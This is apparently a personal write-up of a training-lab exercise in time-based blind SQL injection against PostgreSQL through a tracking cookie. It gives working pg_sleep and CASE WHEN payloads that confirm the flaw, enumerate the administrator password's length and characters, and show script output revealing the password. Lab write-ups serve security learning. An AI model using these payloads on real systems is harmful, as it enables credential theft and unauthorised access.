Lab 14 - Blind SQLi with time delays and information retrieval

Vulnerable parameter - tracking cookie

End Goals:
- Exploit time-based blind SQLi to output the administrator password
- Login as the administrator

Analysis:

1. Confirm that the parameter is vulnerable to SQLi

' || (SELECT pg_sleep(10))--

--> 10000 millisecond response -> is vulnerable

2. Confirm that the users table exists in the database

Have a way to ask the application TRUE or FALSE questions:

' || (SELECT CASE WHEN (1=1) THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END)--
-> when true, sleep for 10 seconds (10,000 millisecond response time)

' || (SELECT CASE WHEN (1=0) THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END)--
-> when false, sleep for -1 seconds (instant response time)

Begin looking for users table...

' || (SELECT CASE WHEN (username='administrator') THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--
-> checks two conditions
--> FROM users: check if users table exists
--> WHEN (username='administrator'): check if username administrator exists

--> 10000 millisecond response -> users table and username administrator exist

3. Enumerate administrator password length

' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=1) THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=2) THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=3) THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--
... etc.
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)=20) THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--
-> length 20 has 10 second response time

--> password length is 20

4. Enumerate the administrator password

' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--

--> This step requires Burp Intruder, which we don't have, so we will skip to the Python scripting part.

==============================================================================================================================================================
Python usage and output:

┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-14]
└─$ python3 sqli-lab-14.py "https://0a4f00af03f22c3c837514a4006c0092.web-security-academy.net"
[+] Checking if tracking cookie is vulnerable to time-based blind SQLi...
y9ipt4o67bcr416rmnl0  

